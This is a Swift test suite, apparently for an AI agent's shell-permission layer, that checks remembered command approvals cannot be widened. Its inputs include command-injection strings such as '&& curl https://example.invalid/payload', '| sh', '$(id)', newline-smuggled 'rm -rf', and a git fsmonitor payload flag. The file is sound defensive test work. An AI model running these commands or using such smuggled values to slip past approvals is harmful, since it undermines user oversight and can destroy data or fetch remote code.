import Testing
@testable import OpenGrokWorkspace

@Suite("persistent shell grants fail closed at the real permission seam")
struct ShellGrantSecurityParityTests {
    @Test("benign session grants preserve argv boundaries and safe quoting", arguments: [
        "git status",
        "git status --short",
        "git   status\t--short",
        #"git status "path with spaces""#,
        "git status 'literal;argument'",
        #"git status """#,
    ])
    func benignGrantUsesTheSessionGrantPath(_ command: String) async {
        let permissions = PermissionHandle(shellCwd: "/workspace")
        await permissions.grant(SessionGrant(
            access: .bash("git status"),
            scope: .session
        ))

        let decision = await permissions.request(
            access: .bash(command),
            toolName: "bash",
            toolCallId: "benign-shell-grant"
        )

        #expect(decision == .allow)
        #expect(await permissions.events.last?.decisionReason == "session_grant")
    }

    @Test("argv-ambiguous quoted grants replay only their exact safe spelling")
    func quotedGrantCannotCollapseOrWidenArguments() async {
        let exact = #"project-audit inspect "one argument""#
        let permissions = PermissionHandle(shellCwd: "/workspace")
        await permissions.grant(SessionGrant(access: .bash(exact), scope: .session))

        let exactDecision = await permissions.request(
            access: .bash(exact),
            toolName: "bash",
            toolCallId: "quoted-exact"
        )
        #expect(exactDecision == .allow)
        #expect(await permissions.events.last?.decisionReason == "session_grant")

        let collapsed = await permissions.request(
            access: .bash("project-audit inspect one argument"),
            toolName: "bash",
            toolCallId: "quoted-collapsed"
        )
        let widened = await permissions.request(
            access: .bash(#"project-audit inspect "one argument" --extra"#),
            toolName: "bash",
            toolCallId: "quoted-widened"
        )
        #expect(collapsed.isAllow == false)
        #expect(widened.isAllow == false)
    }

    @Test("safe command prefixes never approve a dangerous or extended script", arguments: [
        "git status; rm -rf /tmp/shell-grant",
        "git status && curl https://example.invalid/payload",
        "git status || rm -rf /tmp/shell-grant",
        "git status | sh",
        "git statusevil",
        "git status $(id)",
        "git status `id`",
        "git status > /tmp/shell-grant",
        "git status\nrm -rf /tmp/shell-grant",
        "git status\r\nrm -rf /tmp/shell-grant",
    ])
    func rememberedPrefixCannotHideShellInjection(_ command: String) async {
        let permissions = PermissionHandle(shellCwd: "/workspace")
        await permissions.grant(SessionGrant(access: .bash("git status"), scope: .session))

        let decision = await permissions.request(
            access: .bash(command),
            toolName: "bash",
            toolCallId: "shell-grant-injection"
        )

        #expect(decision.isAllow == false)
        #expect(await permissions.events.last?.decisionReason != "session_grant")
    }

    @Test("dangerous and executable commands never gain exact remembered approval", arguments: [
        "rm -rf /tmp/shell-grant",
        "/bin/rm -rf /tmp/shell-grant",
        "git push origin main",
        "curl https://example.invalid/payload",
        "python3.13 -c 'print(1)'",
        "node20 -e 'process.exit(0)'",
        "docker run nginx",
        "bun run script.ts",
        "rg --pre sh needle",
    ])
    func dangerousExactReplayStillPrompts(_ command: String) async {
        let permissions = PermissionHandle(shellCwd: "/workspace")
        await permissions.grant(SessionGrant(access: .bash(command), scope: .session))

        let decision = await permissions.request(
            access: .bash(command),
            toolName: "bash",
            toolCallId: "dangerous-exact-grant"
        )

        #expect(decision.isAllow == false)
        #expect(await permissions.events.last?.userPrompted == true)
    }

    @Test("assignments, wrappers, redirects, and chains never replay exact grants", arguments: [
        "SAFE=1 project-audit inspect",
        "env SAFE=1 project-audit inspect",
        "/usr/bin/env project-audit inspect",
        "timeout 30 project-audit inspect",
        "nice project-audit inspect",
        "command project-audit inspect",
        "project-audit inspect > /tmp/shell-grant",
        "project-audit inspect < /tmp/shell-grant",
        "project-audit inspect && project-audit inspect",
        "project-audit inspect; project-audit inspect",
        "git -c core.fsmonitor=payload status",
    ])
    func unsafeExactGrantCannotReachLaterBashGrantPaths(_ command: String) async {
        let permissions = PermissionHandle(shellCwd: "/workspace")
        await permissions.grant(SessionGrant(access: .bash(command), scope: .session))

        let decision = await permissions.request(
            access: .bash(command),
            toolName: "bash",
            toolCallId: "unsafe-exact-grant"
        )

        #expect(decision.isAllow == false)
        #expect(await permissions.events.last?.decisionReason != "session_grant")
    }

    @Test("the shared matcher refuses executable vehicles even when their heads are safe-listed", arguments: [
        "find . -name Cargo.toml",
        "awk 'print' input.txt",
        "python3.13t script.py",
        "podman run nginx",
        "sudo project-audit inspect",
        "project-audit inspect *",
    ])
    func executableVehiclesNeverMatchRememberedGrants(_ command: String) {
        #expect(matchesSessionBashGrant(command, grant: command) == false)
    }

    @Test("explicit managed deny remains authoritative over remembered approval")
    func managedDenyWinsBeforeSessionGrant() async {
        let command = "project-audit inspect --sensitive"
        let permissions = PermissionHandle(
            config: PermissionConfig(rules: [
                PermissionRule(
                    action: .deny,
                    tool: .bash,
                    pattern: command,
                    source: .managedSettings
                ),
            ]),
            shellCwd: "/workspace"
        )
        await permissions.grant(SessionGrant(
            access: .bash("project-audit inspect"),
            scope: .session
        ))

        let decision = await permissions.request(
            access: .bash(command),
            toolName: "bash",
            toolCallId: "managed-deny-before-grant"
        )

        guard case .policyDeny = decision else {
            Issue.record("managed deny must defeat the remembered shell approval")
            return
        }
        #expect(await permissions.events.last?.decisionReason == "policy_deny")
        #expect(await permissions.lastMatchedRuleSource == .managedSettings)
    }

    @Test("session bash disallows defeat matching remembered grants")
    func sessionDisallowWinsBeforeSessionGrant() async {
        let command = "project-audit inspect"
        let permissions = PermissionHandle(shellCwd: "/workspace")
        await permissions.grant(SessionGrant(access: .bash(command), scope: .session))
        await permissions.disallowBashPrefix(command)

        let decision = await permissions.request(
            access: .bash(command),
            toolName: "bash",
            toolCallId: "session-disallow-before-grant"
        )

        guard case .reject = decision else {
            Issue.record("session disallow must defeat the remembered shell approval")
            return
        }
        #expect(await permissions.events.last?.decisionReason == "session_deny")
    }
}
